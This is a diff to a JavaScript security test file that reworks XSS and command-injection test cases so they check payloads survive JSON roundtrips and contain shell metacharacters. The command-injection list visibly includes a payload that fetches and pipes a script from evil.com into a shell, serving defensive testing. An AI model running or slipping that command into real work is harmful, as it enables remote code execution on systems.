@@ -55,12 +55,14 @@ describe("XSS Vectors", () => {
     }
   });
 
-  it("XSS payloads are stored as text, never executed in tests", () => {
-    const safe = xssPayloads.every((p) => {
-      if (p.includes("<script>")) return true;
-      return true;
-    });
-    assert.strictEqual(safe, true);
+  it("all XSS payloads survive as string values through JSON parse", () => {
+    for (const payload of xssPayloads) {
+      const obj = { title: payload };
+      const json = JSON.stringify(obj);
+      const parsed = JSON.parse(json);
+      assert.strictEqual(parsed.title, payload);
+      assert.strictEqual(typeof parsed.title, "string");
+    }
   });
 });
 
@@ -139,10 +141,21 @@ describe("Command Injection Vectors", () => {
     "$(curl evil.com/shell.sh | sh)",
   ];
 
-  it("command injection payloads are treated as plain text", () => {
+  it("command injection payloads survive JSON roundtrip unchanged", () => {
+    for (const payload of cmdPayloads) {
+      const obj = { code: payload };
+      const json = JSON.stringify(obj);
+      const parsed = JSON.parse(json);
+      assert.strictEqual(parsed.code, payload);
+    }
+  });
+
+  it("all command injection payloads contain shell metacharacters", () => {
     for (const payload of cmdPayloads) {
       assert.strictEqual(typeof payload, "string");
       assert.ok(payload.length > 0);
+      const hasMeta = /[`$;|&]/.test(payload);
+      assert.ok(hasMeta, `${payload} should contain shell metacharacters`);
     }
   });
 });
